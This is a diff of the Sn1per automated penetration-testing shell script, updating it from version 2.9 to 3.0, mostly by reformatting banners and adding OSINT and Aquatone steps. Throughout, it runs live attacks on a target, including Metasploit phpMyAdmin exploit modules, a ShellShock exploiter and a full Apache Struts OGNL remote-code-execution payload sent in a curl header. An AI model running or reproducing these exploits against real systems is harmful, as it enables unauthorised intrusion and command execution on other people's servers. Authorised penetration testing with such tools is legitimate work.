@@ -3,7 +3,7 @@
 # + -- --=[http://crowdshield.com
 #
 
-VER="2.9"
+VER="3.0"
 TARGET="$1"
 MODE="$2"
 OPT1="$3"
@@ -33,19 +33,18 @@ RESET='\e[0m'
 REGEX='^[0-9]+$'
 
 # ENABLE/DISABLE AUTOMATIC BRUTE FORCE
-# DEFAULT IS "1" (ENABLED)
 AUTOBRUTE="1"
 
 # ENABLE/DISABLE FULL DETAILED NMAP SCAN
-# DEFAULT IS "1" (ENABLED)
 FULLNMAPSCAN="0"
 
 # ENABLE/DISABLE AUTOMATIC GOOGLE HACKING QUERIES
-# DEFAULT IS "1" (ENABLED)
 GOOHAK="1"
 
+# ENABLE/DISABLE RECON AND OSINT
+OSINT="1"
+
 # ENABLE AUTO UPDATES
-# DEFAULT IS "1" (ENABLED)
 ENABLE_AUTO_UPDATES="1"
 
 # CHECK DISTRO TYPE
@@ -68,7 +67,7 @@ cd $INSTALL_DIR
 
 function check_online {
   ONLINE=$(curl --connect-timeout 3 -s https://api.github.com/repos/1N3/Sn1per/tags | grep -Po '"name":.*?[^\\]",'| head -1 | cut -c11-13)
-  if [ "$ONLINE" == "" ]; then
+  if [ -z "$ONLINE" ]; then
     ONLINE="0"
     echo -e "$OKBLUE[*] Checking for active internet connection [$RESET${OKRED}FAIL${RESET}$OKBLUE]"
     echo -e "$OKBLUE[$RESET${OKRED}i${RESET}$OKBLUE] sniper is running in offline mode.$RESET"
@@ -79,10 +78,6 @@ function check_online {
 }
 
 function check_update {
-  if [ -z "$ONLINE" ]; then
-    check_online
-  fi
-
   if [ "$ENABLE_AUTO_UPDATES" == "1" ] && [ "$ONLINE" == "1" ]; then
     LATEST_VER=$(curl --connect-timeout 3 -s https://api.github.com/repos/1N3/Sn1per/tags | grep -Po '"name":.*?[^\\]",'| head -1 | cut -c11-13)
     if [ "$LATEST_VER" != "$VER" ]; then
@@ -94,8 +89,7 @@ function check_update {
 function update {
   logo
   echo -e "$OKBLUE[*] Checking for updates...[$RESET${OKGREEN}OK${RESET}$OKBLUE]$RESET"
-  check_online
-  if [ "$ONLINE" == "0" ]; then
+  if [ "$ONLINE" = "0" ]; then
     echo "You will need to download the latest release manually at https://github.com/1N3/Sn1per/"
   else
     LATEST_VER=$(curl --connect-timeout 3 -s https://api.github.com/repos/1N3/Sn1per/tags | grep -Po '"name":.*?[^\\]",'| head -1 | cut -c11-13)
@@ -174,17 +168,16 @@ function loot {
   cp -Rf $LOOT_DIR/notes/ $LOOT_DIR/workspace/$WORKSPACE/ 2> /dev/null
   cp -Rf $LOOT_DIR/web/ $LOOT_DIR/workspace/$WORKSPACE/ 2> /dev/null
   cp -Rf $LOOT_DIR/osint/ $LOOT_DIR/workspace/$WORKSPACE/ 2> /dev/null
-  rm -Rf $LOOT_DIR/{screenshots,nmap,domains,output,reports,imports,notes,web}/ 2> /dev/null
-  mkdir $LOOT_DIR/{screenshots,nmap,domains,output,reports,imports,notes,web}/ -p 2> /dev/null
+  cp -Rf $LOOT_DIR/aquatone/ $LOOT_DIR/workspace/$WORKSPACE/ 2> /dev/null
+  rm -Rf $LOOT_DIR/{aquatone,screenshots,nmap,domains,output,reports,imports,notes,osint,web}/ 2> /dev/null
+  mkdir $LOOT_DIR/{aquatone,screenshots,nmap,domains,output,reports,imports,notes,osint,web}/ -p 2> /dev/null
   echo -e "$OKORANGE + -- --=[Opening workspace directory...$RESET"
-  if [ ${DISTRO} == "blackarch" ]; then
-    firefox 2> /dev/null &
-  else
-    $BROWSER 2> /dev/null &
-  fi
+  $BROWSER 2> /dev/null &
   sleep 2
-  $BROWSER $LOOT_DIR/workspace/$WORKSPACE 2> /dev/null &
+  $BROWSER $LOOT_DIR/workspace/$WORKSPACE/ 2> /dev/null &
   sleep 2
+  echo -e "$OKORANGE + -- --=[Launching Aquatone Report...$RESET"
+  $BROWSER $LOOT_DIR/workspace/$WORKSPACE/aquatone/*/report/report_page_0.html 2> /dev/null &
   echo -e "$OKORANGE + -- --=[Launching Metasploit Pro Web UI...$RESET"
   $BROWSER http://localhost:3001/login 2> /dev/null &
   echo -e "$OKORANGE + -- --=[Done!$RESET"
@@ -288,31 +281,41 @@ if [ "$MODE" = "discover" ]; then
   echo -e "$OKRED                                                              ____ / /"
   echo -e "$OKRED                                                                   \/$RESET"
   echo ""
-  echo -e "$OKGREEN + -- ----------------------------=[Running Ping Discovery Scan]=------------- -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED RUNNING PING DISCOVERY SCAN $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -sP $TARGET | grep ' for ' | awk '{print $5}' | tee $LOOT_DIR/domains/sniper-ping-ips.txt
-  echo -e "$OKGREEN + -- ----------------------------=[Checking ARP Cache]=---------------------- -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED DISPLAYING ARP CACHE $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   arp -a -n | tee $LOOT_DIR/domains/sniper-arp-ips.txt
-  echo -e "$OKGREEN + -- ----------------------------=[Running TCP Port Discovery Scan]=--------- -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED RUNNING TCP PORT SCAN $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   unicornscan -p $DEFAULT_TCP_PORTS $TARGET 2>/dev/null | tee $LOOT_DIR/domains/sniper-tcp-ports.txt
-  cat $LOOT_DIR/domains/sniper-tcp-ports.txt | awk '{print $6}' | sort -u | tee $LOOT_DIR/domains/sniper-tcp-ips.txt
-  echo -e "$OKGREEN + -- ----------------------------=[Running UDP Port Discovery Scan]=--------- -- +$RESET"
+  cat $LOOT_DIR/domains/sniper-tcp-ports.txt | awk '{print $6}' | sort -u > $LOOT_DIR/domains/sniper-tcp-ips.txt
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED RUNNING UDP DISCOVERY SCAN $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   unicornscan -m U -p $DEFAULT_UDP_PORTS $TARGET 2>/dev/null | tee $LOOT_DIR/domains/sniper-udp-ports.txt
   cat $LOOT_DIR/domains/sniper-udp-ports.txt | awk '{print $6}' | sort -u > $LOOT_DIR/domains/sniper-udp-ips.txt
-  echo -e "$OKGREEN + -- ----------------------------=[Current Targets]=------------------------- -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED CURRENT TARGETS $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   cat $LOOT_DIR/domains/sniper-ping-ips.txt $LOOT_DIR/domains/sniper-tcp-ips.txt $LOOT_DIR/domains/sniper-udp-ips.txt > $LOOT_DIR/domains/sniper-ips-unsorted.txt
   sort -u $LOOT_DIR/domains/sniper-ips-unsorted.txt > $LOOT_DIR/domains/sniper-ips.txt
   cat $LOOT_DIR/domains/sniper-ips.txt
-  echo -e "$OKGREEN + -- ----------------------------=[Done!]=----------------------------------- -- +$RESET"
   echo -e "$OKRED[+]$RESET Target list saved to $LOOT_DIR/domains/sniper-ips.txt. "
-  echo -e "$OKREDTo scan all IP's, use sniper $LOOT_DIR/domains/sniper-ips.txt airstrike or nuke modes.$RESET"
-  loot
-  exit
+  echo -e "$OKRED[i] To scan all IP's, use sniper $LOOT_DIR/domains/sniper-ips.txt airstrike or nuke modes. $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED SCAN COMPLETE! $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+exit
 fi
 
 if [ "$MODE" = "web" ]; then
   if [ "$OPT1" = "report" ]; then
     sniper $TARGET $MODE | tee $LOOT_DIR/sniper-$TARGET-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
-    loot
     exit
   fi
 fi
@@ -321,7 +324,6 @@ fi
 if [ "$MODE" = "webporthttp" ]; then
   if [ "$OPT2" = "report" ]; then
     sniper $TARGET $MODE $OPT1 | tee $LOOT_DIR/sniper-$TARGET-$MODE-$OPT1`date +%Y%m%d%H%M`.txt 2>&1
-    loot
     exit
   fi 
   echo -e "$OKRED                ____               $RESET"
@@ -370,21 +372,29 @@ if [ "$MODE" = "webporthttp" ]; then
 
   PORT="$OPT1"
   echo ""
-  echo -e "$OKGREEN + -- ----------------------------=[Running TCP port scan]=------------------- -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED RUNNING TCP PORT SCAN $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -sV -Pn -p $PORT --open $TARGET -oX $LOOT_DIR/nmap/nmap-http-$TARGET.xml
   port_http=`grep 'portid="'$PORT'"' $LOOT_DIR/nmap/nmap-http-$TARGET.xml | grep open`
   if [ -z "$port_http" ]; then
     echo -e "$OKRED + -- --=[Port $PORT closed... skipping.$RESET"
   else
     echo -e "$OKORANGE + -- --=[Port $PORT opened... running tests...$RESET"
-    echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED CHECKING FOR WAF $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     wafw00f http://$TARGET:$PORT
     echo ""
-    echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING HTTP INFO $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     whatweb http://$TARGET:$PORT
     xsstracer $TARGET $PORT
     echo ""
-    echo -e "$OKGREEN + -- ----------------------------=[Checking HTTP Headers]=------------------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED CHECKING HTTP HEADERS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKBLUE+ -- --=[Checking if X-Content options are enabled on $TARGET...$RESET $OKORANGE"
     curl -s --insecure -I http://$TARGET:$PORT | egrep -i 'X-Content' | tail -n 10
     echo ""
@@ -435,61 +445,94 @@ if [ "$MODE" = "webporthttp" ]; then
     curl -s --insecure http://$TARGET:$PORT/test.aspx -L | egrep -i 'Error|Exception|System.Web.' | tail -n 10
     echo ""
     echo -e "$RESET"
-    echo -e "$OKGREEN + -- ----------------------------=[Running Web Vulnerability Scan]=---------- -- +$RESET"
-    nikto -h http://$TARGET:$PORT
-    echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED SAVING SCREENSHOTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/screenshots/$TARGET-port$PORT.jpg"
     if [ ${DISTRO} == "blackarch"  ]; then
       /bin/CutyCapt --url=http://$TARGET:$PORT --out=$LOOT_DIR/screenshots/$TARGET-port$PORT.jpg
     else
       cutycapt --url=http://$TARGET:$PORT --out=$LOOT_DIR/screenshots/$TARGET-port$PORT.jpg
     fi
-    echo -e "$OKGREEN + -- ----------------------------=[Running NMap HTTP Scripts]=--------------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     nmap -A -Pn -T5 -p $PORT -sV --script=/usr/share/nmap/scripts/iis-buffer-overflow.nse --script=http-vuln* $TARGET
-    echo -e "$OKGREEN + -- ----------------------------=[Running Directory Brute Force]=----------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING FILE/DIRECTORY BRUTE FORCE $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     #dirb http://$TARGET:$PORT
     python $PLUGINS_DIR/cansina/cansina.py -u http://$TARGET:$PORT -p $PLUGINS_DIR/cansina/dirbuster-quick.txt
-    echo -e "$OKGREEN + -- ----------------------------=[Enumerating Common Web Software]=--------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED ENUMERATING WEB SOFTWARE $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     clusterd -i $TARGET
-    echo -e "$OKGREEN + -- ----------------------------=[Running Wordpress Vulnerability Scans]=--- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING WORDPRESS VULNERABILITY SCAN $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     wpscan --url http://$TARGET:$PORT --batch
     echo ""
     wpscan --url http://$TARGET:$PORT/wordpress/ --batch
     echo ""
-    echo -e "$OKGREEN + -- ----------------------------=[Running CMSMap]=-------------------------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING CMSMAP $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     python $CMSMAP -t http://$TARGET:$PORT
     echo ""
     python $CMSMAP -t http://$TARGET/wordpress/
     echo ""
-    echo -e "$OKGREEN + -- ----------------------------=[Running Arachni Web Application Scan]=---- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING WEB VULNERABILITY SCAN $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nikto -h http://$TARGET:$PORT
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING ARACHNI WEB APPLICATION SCAN $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     mkdir -p $INSTALL_DIR/loot/web/$TARGET-http-$PORT/ 2> /dev/null
     arachni --report-save-path=$INSTALL_DIR/loot/web/$TARGET-http-$PORT/ --output-only-positives http://$TARGET:$PORT
     cd $INSTALL_DIR/loot/web/$TARGET-http-$PORT/
     arachni_reporter $INSTALL_DIR/loot/web/$TARGET-http-$PORT/*.afr --report=html:outfile=$INSTALL_DIR/loot/web/$TARGET-http-$PORT/arachni.zip
     unzip $INSTALL_DIR/loot/web/$TARGET-http-$PORT/arachni.zip
     cd $INSTALL_DIR
-    echo -e "$OKGREEN + -- ----------------------------=[Running SQLMap SQL Injection Scan]=------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING SQLMAP SCAN $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     sqlmap -u "http://$TARGET:$PORT" --batch --crawl=5 --level 1 --risk 1 -f -a
-    echo -e "$OKGREEN + -- ----------------------------=[Running PHPMyAdmin Metasploit Exploit]=--- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING PHPMYADMIN METASPLOIT EXPLOIT $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT $PORT; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
-    echo -e "$OKGREEN + -- ----------------------------=[Running ShellShock Auto-Scan Exploit]=---- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING SHELLSHOCK EXPLOIT SCAN $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     python $PLUGINS_DIR/shocker/shocker.py -H $TARGET --cgilist $PLUGINS_DIR/shocker/shocker-cgi_list --port $PORT
-    echo -e "$OKGREEN + -- ----------------------------=[Running Apache Jakarta RCE Exploit]=------ -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING APACHE JAKARTA RCE EXPLOIT $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     curl -s -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'" http://$TARGET:$PORT | head -n 1
 
     if [ $SCAN_TYPE == "DOMAIN" ]; then
-      if [ "$GOOHAK" = "0" ]; then
-        echo -e "$OKGREEN + -- ----------------------------=[Skipping Google Hacking Queries]=-------------------- -- +$RESET"
+      if [ $GOOHAK == "0" ]; then
+        echo -e "${OKGREEN}====================================================================================${RESET}"
+        echo -e "$OKRED SKIPPING GOOGLE HACKING QUERIES $RESET"
+        echo -e "${OKGREEN}====================================================================================${RESET}"
       else
-        echo -e "$OKGREEN + -- ----------------------------=[Running Google Hacking Queries]=--------------------- -- +$RESET"
+        echo -e "${OKGREEN}====================================================================================${RESET}"
+        echo -e "$OKRED RUNNING GOOGLE HACKING QUERIES $RESET"
+        echo -e "${OKGREEN}====================================================================================${RESET}"
         goohak $TARGET > /dev/null
       fi
-      echo -e "$OKGREEN + -- ----------------------------=[Running InUrlBR OSINT Queries]=---------- -- +$RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING INURLBR OSINT QUERIES $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
       php $INURLBR --dork "site:$TARGET" -s inurlbr-$TARGET.txt
       rm -Rf output/ cookie.txt exploits.conf
       GHDB="1"
     fi
   fi
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED SCAN COMPLETE! $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   exit
 fi
 
@@ -546,7 +589,9 @@ if [ "$MODE" = "webporthttps" ]; then
 
   PORT="$OPT1"
   echo ""
-  echo -e "$OKGREEN + -- ----------------------------=[Running TCP port scan]=------------------- -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED RUNNING TCP PORT SCAN $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -sV -T5 -Pn -p $PORT --open $TARGET -oX $LOOT_DIR/nmap/nmap-https-$TARGET.xml
   port_https=`grep 'portid="'$PORT'"' $LOOT_DIR/nmap/nmap-https-$TARGET.xml | grep open`
   if [ -z "$port_https" ];
@@ -554,20 +599,21 @@ if [ "$MODE" = "webporthttps" ]; then
     echo -e "$OKRED + -- --=[Port $PORT closed... skipping.$RESET"
   else
     echo -e "$OKORANGE + -- --=[Port $PORT opened... running tests...$RESET"
-    echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED CHECKING FOR WAF $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     wafw00f https://$TARGET:$PORT
     echo ""
-    echo -e "$OKGREEN + -- ----------------------------=[Checking Cloudflare]=--------------------- -- +$RESET"
-    cd $PLUGINS_DIR/CloudFail/
-    python3 cloudfail.py --target $TARGET
-    cd $INSTALL_DIR
-    echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING HTTP INFO $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     whatweb https://$TARGET:$PORT
     echo ""
-    echo -e "$OKGREEN + -- ----------------------------=[Gathering SSL/TLS Info]=------------------ -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING SSL/TLS INFO $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET
     sslscan --no-failed $TARGET
-    testssl $TARGET
     echo ""
     if [ $DISTRO == "blackarch" ]; then
       massbleed $TARGET port $PORT
@@ -576,7 +622,9 @@ if [ "$MODE" = "webporthttps" ]; then
       ./massbleed $TARGET port $PORT
     fi
     cd $INSTALL_DIR
-    echo -e "$OKGREEN + -- ----------------------------=[Checking HTTP Headers]=------------------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED CHECKING HTTP HEADERS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKBLUE+ -- --=[Checking if X-Content options are enabled on $TARGET...$RESET $OKORANGE"
     curl -s --insecure -I https://$TARGET:$PORT | egrep -i 'X-Content' | tail -n 10
     echo ""
@@ -627,67 +675,95 @@ if [ "$MODE" = "webporthttps" ]; then
     curl -s --insecure https://$TARGET:$PORT/test.aspx -L | egrep -i 'Error|Exception|System.Web.' | tail -n 10
     echo ""
     echo -e "$RESET"
-    echo -e "$OKGREEN + -- ----------------------------=[Running Web Vulnerability Scan]=---------- -- +$RESET"
-    nikto -h https://$TARGET:$PORT
-    echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED SAVING SCREENSHOTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     if [ ${DISTRO} == "blackarch"  ]; then
       /bin/CutyCapt --url=https://$TARGET:$PORT --out=$LOOT_DIR/screenshots/$TARGET-port$PORT.jpg
     else
       cutycapt --url=https://$TARGET:$PORT --out=$LOOT_DIR/screenshots/$TARGET-port$PORT.jpg
     fi
     echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/screenshots/$TARGET-port$PORT.jpg"
-    echo -e "$OKGREEN + -- ----------------------------=[Running NMap HTTP Scripts]=--------------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     nmap -A -sV -T5 -Pn -p $PORT --script=/usr/share/nmap/scripts/iis-buffer-overflow.nse --script=http-vuln* $TARGET
-    echo -e "$OKGREEN + -- ----------------------------=[Running Directory Brute Force]=----------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING FILE/DIRECTORY BRUTE FORCE $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     #dirb https://$TARGET:$PORT
     python $PLUGINS_DIR/cansina/cansina.py -u https://$TARGET:$PORT -p $PLUGINS_DIR/cansina/dirbuster-quick.txt
-    echo -e "$OKGREEN + -- ----------------------------=[Enumerating Common Web Software]=--------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED ENUMERATING WEB SOFTWARE $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     clusterd --ssl -i $TARGET
-    echo -e "$OKGREEN + -- ----------------------------=[Running Wordpress Vulnerability Scans]=--- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING WORDPRESS VULNERABILITY SCAN $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     wpscan --url https://$TARGET:$PORT --batch
     echo ""
     wpscan --url https://$TARGET:$PORT/wordpress/ --batch
-    echo -e "$OKGREEN + -- ----------------------------=[Running CMSMap]=-------------------------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING CMSMAP $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     python $CMSMAP -t https://$TARGET:$PORT
     echo ""
     python $CMSMAP -t https://$TARGET:$PORT/wordpress/
     echo ""
-    if [ $ARACHNI == "1" ];
-    then
-      echo -e "$OKGREEN + -- ----------------------------=[Skipping Arachni Scan]=------------------- -- +$RESET"
-    else
-      echo -e "$OKGREEN + -- ----------------------------=[Running Arachni Web Application Scan]=---- -- +$RESET"
-      mkdir -p $INSTALL_DIR/loot/web/$TARGET-https-$PORT/ 2> /dev/null
-      arachni --report-save-path=$INSTALL_DIR/loot/web/$TARGET-https-$PORT/ --output-only-positives https://$TARGET:$PORT
-      cd $INSTALL_DIR/loot/web/$TARGET-https-$PORT/
-      arachni_reporter $INSTALL_DIR/loot/web/$TARGET-https-$PORT/*.afr --report=html:outfile=$INSTALL_DIR/loot/web/$TARGET-https-$PORT/arachni.zip
-      unzip $INSTALL_DIR/loot/web/$TARGET-https-$PORT/arachni.zip
-      cd $INSTALL_DIR
-    fi
-    echo -e "$OKGREEN + -- ----------------------------=[Running SQLMap SQL Injection Scan]=------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING WEB VULNERABILITY SCAN $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nikto -h https://$TARGET:$PORT
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING ARACHNI SCAN $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    mkdir -p $INSTALL_DIR/loot/web/$TARGET-https-$PORT/ 2> /dev/null
+    arachni --report-save-path=$INSTALL_DIR/loot/web/$TARGET-https-$PORT/ --output-only-positives https://$TARGET:$PORT
+    cd $INSTALL_DIR/loot/web/$TARGET-https-$PORT/
+    arachni_reporter $INSTALL_DIR/loot/web/$TARGET-https-$PORT/*.afr --report=html:outfile=$INSTALL_DIR/loot/web/$TARGET-https-$PORT/arachni.zip
+    unzip $INSTALL_DIR/loot/web/$TARGET-https-$PORT/arachni.zip
+    cd $INSTALL_DIR
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING SQLMAP SCAN $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     sqlmap -u "https://$TARGET:$PORT" --batch --crawl=5 --level 1 --risk 1 -f -a
-    echo -e "$OKGREEN + -- ----------------------------=[Running PHPMyAdmin Metasploit Exploit]=--- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING PHPMYADMIN METASPLOIT EXPLOIT $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 443; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
-    echo -e "$OKGREEN + -- ----------------------------=[Running ShellShock Auto-Scan Exploit]=---- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING SHELLSHOCK EXPLOIT SCAN $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     python $PLUGINS_DIR/shocker/shocker.py -H $TARGET --cgilist $PLUGINS_DIR/shocker/shocker-cgi_list --port 443 --ssl
-    echo -e "$OKGREEN + -- ----------------------------=[Running Apache Jakarta RCE Exploit]=------ -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING APACHE JAKARTA RCE EXPLOIT $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     curl -s -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" https://$TARGET:$PORT | head -n 1
-    if [ $SCAN_TYPE == "DOMAIN" ];
+    if [ $SCAN_TYPE == "DOMAIN" ] && [ $OSINT == "1" ];
     then
       if [ -z $GHDB ];
       then
-        if [ "$GOOHAK" = "0" ]; then
-          echo -e "$OKGREEN + -- ----------------------------=[Skipping Google Hacking Queries]=-------------------- -- +$RESET"
+        if [ $GOOHAK == "0" ]; then
+          echo -e "${OKGREEN}====================================================================================${RESET}"
+          echo -e "$OKRED SKIPPING GOOGLE HACKING QUERIES $RESET"
+          echo -e "${OKGREEN}====================================================================================${RESET}"
         else
-          echo -e "$OKGREEN + -- ----------------------------=[Running Google Hacking Queries]=--------------------- -- +$RESET"
+          echo -e "${OKGREEN}====================================================================================${RESET}"
+          echo -e "$OKRED RUNNING GOOGLE HACKING QUERIES $RESET"
+          echo -e "${OKGREEN}====================================================================================${RESET}"
           goohak $TARGET > /dev/null
         fi
-        echo -e "$OKGREEN + -- ----------------------------=[Running InUrlBR OSINT Queries]=----------- -- +$RESET"
